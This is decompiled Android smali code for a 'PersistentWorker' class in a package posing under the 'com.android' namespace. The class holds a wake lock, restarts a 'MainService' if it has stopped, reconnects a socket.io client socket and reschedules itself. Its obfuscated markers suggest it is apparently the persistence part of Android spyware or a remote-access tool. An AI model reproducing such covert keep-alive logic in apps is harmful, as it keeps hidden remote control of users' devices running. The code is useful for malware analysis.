.class public Lcom/android/pictach/PersistentWorker;
.super Landroidx/work/Worker;
# ep-fcujmybaeblb
# verified-44864
# optimised-28832
# generated-28424
.source "pqoimxfm.java"


# instance fields
.field public h:Landroid/os/PowerManager$WakeLock;


# direct methods
.method public constructor <init>(Landroid/content/Context;Landroidx/work/WorkerParameters;)V
    .locals 0

    invoke-direct {p0, p1, p2}, Landroidx/work/Worker;-><init>(Landroid/content/Context;Landroidx/work/WorkerParameters;)V

    return-void
.end method


# virtual methods
.method public final g()Landroidx/work/c$a;
    .locals 5

    .line 1
    new-instance v0, Ljava/util/Date;

    .line 3
    invoke-direct {v0}, Ljava/util/Date;-><init>()V

    .line 6
    invoke-virtual {v0}, Ljava/util/Date;->toString()Ljava/lang/String;

    .line 9
    iget-object v0, p0, Landroidx/work/c;->c:Landroid/content/Context;

    .line 11
    const-string v1, "power"

    .line 13
    invoke-virtual {v0, v1}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    .line 16
    move-result-object v1

    .line 17
    check-cast v1, Landroid/os/PowerManager;

    .line 19
    const/4 v2, 0x1

    .line 20
    const-string v3, "MyApp:PersistentWorkerLock"

    .line 22
    invoke-virtual {v1, v2, v3}, Landroid/os/PowerManager;->newWakeLock(ILjava/lang/String;)Landroid/os/PowerManager$WakeLock;

    .line 25
    move-result-object v1

    .line 26
    iput-object v1, p0, Lcom/android/pictach/PersistentWorker;->h:Landroid/os/PowerManager$WakeLock;

    .line 28
    const-wide/32 v3, 0x927c0

    .line 31
    invoke-virtual {v1, v3, v4}, Landroid/os/PowerManager$WakeLock;->acquire(J)V

    .line 34
    :try_start_0
    invoke-virtual {p0}, Lcom/android/pictach/PersistentWorker;->h()Z

    .line 37
    move-result v1

    .line 38
    sget-object v3, Lb8;->b:Lio/socket/client/Socket;

    .line 40
    if-eqz v3, :cond_0

    .line 42
    invoke-virtual {v3}, Lio/socket/client/Socket;->connected()Z

    .line 45
    move-result v3

    .line 46
    if-eqz v3, :cond_0

    .line 48
    goto :goto_0

    .line 49
    :cond_0
    const/4 v2, 0x0

    .line 50
    :goto_0
    if-nez v1, :cond_1

    .line 52
    invoke-virtual {p0}, Lcom/android/pictach/PersistentWorker;->k()V

    .line 55
    :cond_1
    if-nez v2, :cond_2

    .line 57
    invoke-static {v0}, Lb8;->b(Landroid/content/Context;)V

    .line 60
    :cond_2
    invoke-virtual {p0}, Lcom/android/pictach/PersistentWorker;->j()V

    .line 63
    new-instance v0, Landroidx/work/c$a$c;

    .line 65
    invoke-direct {v0}, Landroidx/work/c$a$c;-><init>()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    .line 68
    invoke-virtual {p0}, Lcom/android/pictach/PersistentWorker;->i()V

    .line 71
    return-object v0

    .line 72
    :catchall_0
    move-exception v0

    .line 73
    goto :goto_1

    .line 74
    :catch_0
    move-exception v0

    .line 75
    :try_start_1
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 78
    new-instance v0, Landroidx/work/c$a$b;

    .line 80
    invoke-direct {v0}, Landroidx/work/c$a$b;-><init>()V
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 83
    invoke-virtual {p0}, Lcom/android/pictach/PersistentWorker;->i()V

    .line 86
    return-object v0

    .line 87
    :goto_1
    invoke-virtual {p0}, Lcom/android/pictach/PersistentWorker;->i()V

    .line 90
    throw v0
.end method

.method public final h()Z
    .locals 4

    .line 1
    const-class v0, Lcom/android/pictach/MainService;

    .line 3
    :try_start_0
    iget-object v1, p0, Landroidx/work/c;->c:Landroid/content/Context;

    .line 5
    const-string v2, "activity"

    .line 7
    invoke-virtual {v1, v2}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    .line 10
    move-result-object v1

    .line 11
    check-cast v1, Landroid/app/ActivityManager;

    .line 13
    const v2, 0x7fffffff

    .line 16
    invoke-virtual {v1, v2}, Landroid/app/ActivityManager;->getRunningServices(I)Ljava/util/List;

    .line 19
    move-result-object v1

    .line 20
    invoke-interface {v1}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    .line 23
    move-result-object v1

    .line 24
    :cond_0
    invoke-interface {v1}, Ljava/util/Iterator;->hasNext()Z

    .line 27
    move-result v2

    .line 28
    if-eqz v2, :cond_1

    .line 30
    invoke-interface {v1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    .line 33
    move-result-object v2

    .line 34
    check-cast v2, Landroid/app/ActivityManager$RunningServiceInfo;

    .line 36
    invoke-virtual {v0}, Ljava/lang/Class;->getName()Ljava/lang/String;

    .line 39
    move-result-object v3

    .line 40
    iget-object v2, v2, Landroid/app/ActivityManager$RunningServiceInfo;->service:Landroid/content/ComponentName;

    .line 42
    invoke-virtual {v2}, Landroid/content/ComponentName;->getClassName()Ljava/lang/String;

    .line 45
    move-result-object v2

    .line 46
    invoke-virtual {v3, v2}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    .line 49
    move-result v2
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 50
    if-eqz v2, :cond_0

    .line 52
    const/4 v0, 0x1

    .line 53
    return v0

    .line 54
    :catch_0
    move-exception v0

    .line 55
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 58
    :cond_1
    const/4 v0, 0x0

    .line 59
    return v0
.end method

.method public final i()V
    .locals 1

    .line 1
    iget-object v0, p0, Lcom/android/pictach/PersistentWorker;->h:Landroid/os/PowerManager$WakeLock;

    .line 3
    if-eqz v0, :cond_0

    .line 5
    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->isHeld()Z

    .line 8
    move-result v0

    .line 9
    if-eqz v0, :cond_0

    .line 11
    :try_start_0
    iget-object v0, p0, Lcom/android/pictach/PersistentWorker;->h:Landroid/os/PowerManager$WakeLock;

    .line 13
    invoke-virtual {v0}, Landroid/os/PowerManager$WakeLock;->release()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 16
    goto :goto_0

    .line 17
    :catch_0
    move-exception v0

    .line 18
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 21
    :cond_0
    :goto_0
    return-void
.end method

.method public final j()V
    .locals 3

    .line 1
    :try_start_0
    iget-object v0, p0, Landroidx/work/c;->c:Landroid/content/Context;

    .line 3
    invoke-static {v0}, Lp20;->d(Landroid/content/Context;)Lp20;

    .line 6
    move-result-object v0

    .line 7
    new-instance v1, Lkp$a;

    .line 9
    sget-object v2, Ljava/util/concurrent/TimeUnit;->MINUTES:Ljava/util/concurrent/TimeUnit;

    .line 11
    invoke-direct {v1, v2}, Lkp$a;-><init>(Ljava/util/concurrent/TimeUnit;)V

    .line 14
    sget-object v2, Ljava/util/concurrent/TimeUnit;->MILLISECONDS:Ljava/util/concurrent/TimeUnit;

    .line 16
    invoke-virtual {v1, v2}, Lz20$a;->d(Ljava/util/concurrent/TimeUnit;)Lz20$a;

    .line 19
    move-result-object v1

    .line 20
    check-cast v1, Lkp$a;

    .line 22
    invoke-virtual {v1}, Lz20$a;->a()Lz20;

    .line 25
    move-result-object v1

    .line 26
    check-cast v1, Lkp;

    .line 28
    invoke-virtual {v0, v1}, Lp20;->b(Lkp;)Lap;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 31
    goto :goto_0

    .line 32
    :catch_0
    move-exception v0

    .line 33
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 36
    :goto_0
    return-void
.end method

.method public final k()V
    .locals 4

    .line 1
    :try_start_0
    iget-object v0, p0, Landroidx/work/c;->c:Landroid/content/Context;

    .line 3
    new-instance v1, Landroid/content/Intent;

    .line 5
    const-class v2, Lcom/android/pictach/MainService;

    .line 7
    invoke-direct {v1, v0, v2}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    .line 10
    const-string v2, "fromWorker"

    .line 12
    const/4 v3, 0x1

    .line 13
    invoke-virtual {v1, v2, v3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Z)Landroid/content/Intent;

    .line 16
    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I

    .line 18
    const/16 v3, 0x1a

    .line 20
    if-lt v2, v3, :cond_0

    .line 22
    invoke-static {v0, v1}, Lt;->o(Landroid/content/Context;Landroid/content/Intent;)V

    .line 25
    goto :goto_0

    .line 26
    :cond_0
    invoke-virtual {v0, v1}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 29
    goto :goto_0

    .line 30
    :catch_0
    move-exception v0

    .line 31
    invoke-virtual {v0}, Ljava/lang/Throwable;->getMessage()Ljava/lang/String;

    .line 34
    :goto_0
    return-void
.end method
